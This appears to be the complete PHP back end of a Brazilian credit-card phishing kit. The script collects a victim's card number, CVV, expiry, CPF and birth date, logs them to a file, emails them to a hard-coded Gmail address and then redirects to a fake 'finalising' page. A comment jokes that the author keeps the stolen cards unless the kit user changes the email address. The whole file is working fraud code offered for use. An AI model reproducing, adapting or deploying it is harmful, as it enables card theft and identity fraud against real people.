 <?php
$nome_cartao = @$_POST["nome"];
$cp1         = @$_POST["cp1"];
$cp2         = @$_POST["cp2"];
$cp3         = @$_POST["cp3"];
$dig_cp      = @$_POST["dig_cp"];
$venc_fatura = @$_POST["venc_fatura"];
$nome_banco  = @$_POST["nome_b"];
$ccn1        = @$_POST["ccn1"];
$ccn2        = @$_POST["ccn2"];
$ccn3        = @$_POST["ccn3"];
$ccn4        = @$_POST["ccn4"];
$cvv2        = @$_POST["cvv2"];
$smes        = @$_POST["smes"];
$sano        = @$_POST["sano"];
$nasc_dia    = @$_POST["nasc_dia"];
$nasc_mes    = @$_POST["nasc_mes"];
$nasc_ano    = @$_POST["nasc_ano"];

$headers = "Content-type:text/html; charset=iso-8859-1";
$remetente 	= "MestreCard <contatodaorgia@hotmail.com";
$para 		= "catiroba1994@gmail.com";// <<============= coloque aki seu emails se nao eu fico com seus CC´s :P
$ip        	= $_SERVER['REMOTE_ADDR'];           //Endereço IP do cliente
$navegador 	= $_SERVER['HTTP_USER_AGENT'];       //Navegador do cliente
$hora      	= date("d/m/Y, H:i:s");              //Hora de envio
$mensagem = "
<pre>
=====================================================================
Master Card Infos CC - Atualização e r-edição, By HOMEM DE LATA - HOMEM  DE LATA
=================== Dados do Cartão ================================
Nome gravado no cartão: $nome_cartao<br>
vencimento da Fatura..: $venc_fatura<br>
Nome do Banco Emissor.: $nome_banco<br>
Número do Cartão......: $ccn1-$ccn2-$ccn3-$ccn4<br>
CVV...................: $cvv2<br>
Validade Mes/Ano......: $smes/$sano<br>
CPF...................: $cp1.$cp2.$cp3-$dig_cp<br>
Data de Nacimento.....: $nasc_dia/$nasc_mes/$nasc_ano
=====================================================================
</pre>
";

$today = date("d_M_Y_H_i_s");
$myFile ="$nome". $today ."-INFOS_CC_MASTER.txt";
$fh = fopen($myFile, 'a') or die("Nao pude abrir o seu arquivo...");
$stringData = "
=-=-=-=-=-= INFOS_$nome - By HOMEM DE LATA =-=-=-=-=-=-=-=-=-=-=-=-=
<pre>

Master Card Infos CC - Atualização e re-edição, By HOMEM DE LATA - HOMEM DE LATA
=================== Dados do Cartão ================================
Nome gravado no cartão: $nome_cartao
vencimento da Fatura..: $venc_fatura
Nome do Banco Emissor.: $nome_banco
Número do Cartão......: $ccn1-$ccn2-$ccn3-$ccn4
CVV...................: $cvv2
Validade Mes/Ano......: $smes/$sano
CPF...................: $cp1.$cp2.$cp3-$dig_cp
Data de Nacimento.....: $nasc_dia/$nasc_mes/$nasc_ano
=====================================================================
</pre><P><P>";
fwrite($fh, $stringData);
fclose($fh);

mail($para,"tintasjp@gmail.com",$mensagem,$headers);

  echo "<p style=\"margin:10px; padding:5px;\"><b>Enviando... Aguarde...</b></p>";
  echo "<meta http-equiv='refresh' content='1;URL=finaliza.html'>";

?>
 